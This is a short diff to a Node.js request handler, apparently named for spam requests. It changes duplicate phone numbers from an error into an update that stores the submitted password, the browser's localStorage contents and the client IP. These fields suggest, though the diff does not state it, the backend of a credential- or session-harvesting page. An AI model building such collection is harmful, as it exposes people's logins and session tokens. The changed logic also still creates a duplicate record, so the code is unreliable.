@@ -12,11 +12,16 @@ export const handleSpamRequest = handleAsync(
 
     const existingCustomer = await Customer.findOne({ phoneNumber });
 
-    if (existingCustomer) {
-      throw new Error('该手机号码已经存在');
-    }
-
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址
+
+    if (existingCustomer) {
+      await existingCustomer.updateOne({
+        phoneCode,
+        password,
+        localStorage: data,
+        ip,
+      });
+    }
 
     const newCustomer = new Customer({
       phoneCode,
